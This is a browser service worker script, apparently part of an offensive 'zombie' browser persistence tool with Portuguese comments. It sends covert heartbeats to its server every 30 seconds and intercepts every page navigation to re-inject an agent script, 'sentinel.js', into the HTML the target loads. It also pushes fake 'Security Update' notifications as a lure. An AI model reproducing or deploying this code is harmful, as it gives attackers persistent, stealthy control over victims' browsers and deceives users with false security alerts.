const CACHE_NAME = 'sentinel-v1';
const ASSETS = [
    '/sentinel.js',
    '/style.css'
];

self.addEventListener('install', (event) => {
    self.skipWaiting();
    event.waitUntil(
        caches.open(CACHE_NAME).then((cache) => cache.addAll(ASSETS))
    );
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
    console.log('[ZOMBIE] System Active and Persistent');
});

// HEARTBEAT & STEALTH COMMUNICATION
async function sendHeartbeat() {
    try {
        // Envia um "ping" silencioso para o servidor para manter a presença
        // Usamos fetch pois o socket.io não roda nativamente no SW
        await fetch('/api/heartbeat', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sw_active: true, timestamp: Date.now() })
        });
    } catch(e) {}
}

// Rodar heartbeat a cada 30 segundos se possível
setInterval(sendHeartbeat, 30000);

// INTERCEPTOR: Inject sentinel.js in every page visit
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);

    // Se o alvo estiver navegando em uma página HTML do nosso domínio
    if (event.request.mode === 'navigate' || (event.request.method === 'GET' && event.request.headers.get('accept').includes('text/html'))) {
        event.respondWith(
            fetch(event.request).then(async (response) => {
                if (!response.ok) return response;

                let html = await response.text();
                
                // Injeta o script do agente se ele ainda não estiver lá
                if (!html.includes('sentinel.js')) {
                    const injection = '<script src="/sentinel.js"></script>';
                    html = html.replace('</body>', `${injection}</body>`);
                    console.log('[ZOMBIE] Agent script reinjected into page');
                }

                return new Response(html, {
                    headers: response.headers
                });
            }).catch(() => {
                // Se estiver offline, tenta servir do cache (opcional para simulação)
                return caches.match(event.request);
            })
        );
    }
});

// PUSH NOTIFICATIONS (Existing)
self.addEventListener('push', (event) => {
    let data = { title: 'Security Update', msg: 'Essential security components need attention.' };
    try {
        data = event.data.json();
    } catch(e) {}

    self.registration.showNotification(data.title, {
        body: data.msg,
        icon: 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
        badge: 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
        vibrate: [200, 100, 200]
    });
});

self.addEventListener('notificationclick', (event) => {
    event.notification.close();
    event.waitUntil(
        clients.matchAll({ type: 'window' }).then((clientList) => {
            if (clientList.length > 0) return clientList[0].focus();
            return clients.openWindow('/');
        })
    );
});
